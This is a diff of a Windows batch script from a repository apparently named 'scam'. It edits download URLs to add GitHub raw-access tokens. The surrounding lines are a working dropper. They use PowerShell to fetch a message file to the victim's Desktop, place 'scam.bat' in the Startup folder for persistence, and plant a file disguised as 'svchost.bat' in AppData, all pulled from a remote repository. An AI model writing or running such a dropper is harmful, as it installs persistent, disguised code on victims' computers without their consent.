@@ -46,15 +46,15 @@ cls
 start https://vk.com/invite/AMKGDq4
 
 set "msg_path=%USERPROFILE%\Desktop\read me.txt"
-set "github_url=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/read me.txt"
+set "github_url=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/readme.txt?token=GHSAT0AAAAAACWH3KDZBN3M4PAHFFFQOHTMZYCXLBQ"
 
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%github_url%', '%msg_path%')"
 
 set "file_path=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\scam.bat"
-set "github_url=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/scam.bat"
+set "github_url=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/scam.bat?token=GHSAT0AAAAAACWH3KDYI6N6OU5OD67LP5OAZYCXL2A"
 
 set "sv_path=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\svchost.bat"
-set "github_sv=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/svchost.bat"
+set "github_sv=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/svchost.bat?token=GHSAT0AAAAAACWH3KDYNXG44PQLOBM67XRGZYCXMEQ"
 
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%github_url%', '%file_path%')"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%github_sv%', '%sv_path%')"
